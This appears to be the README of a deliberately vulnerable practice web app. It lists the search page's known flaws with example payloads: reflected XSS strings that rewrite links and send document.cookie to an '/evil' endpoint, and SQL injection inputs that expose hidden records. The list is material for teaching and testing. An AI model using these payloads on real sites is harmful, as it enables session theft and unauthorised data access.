# Web Playground
A web application demonstrating web vulnerabilities. Testing XSS, script injection, SQL injection,...

# Known issues

Here is a list of all known voulnarbilities on the site

## Search

1. XSS: When displaying "You searched for <string>" the string is not properly
escaped.
   * Test for XSS: `<script> alert("XSS!") </script>`
   * Change all links: `Facebook <script> $(function(){$("a").attr("href", "/evil");}); </script>`
   * Steal cookies: `<script> $.get("/evil?save=cookie&cookie="+encodeURI(document.cookie)); </script>`
2. SQL Injection: SQL query is manually created and not properly escaped.
   * Test shows stack trace and actual code: `'`
   * See all hidden links: `aaa ' OR hide=1 OR hide='`

## Login

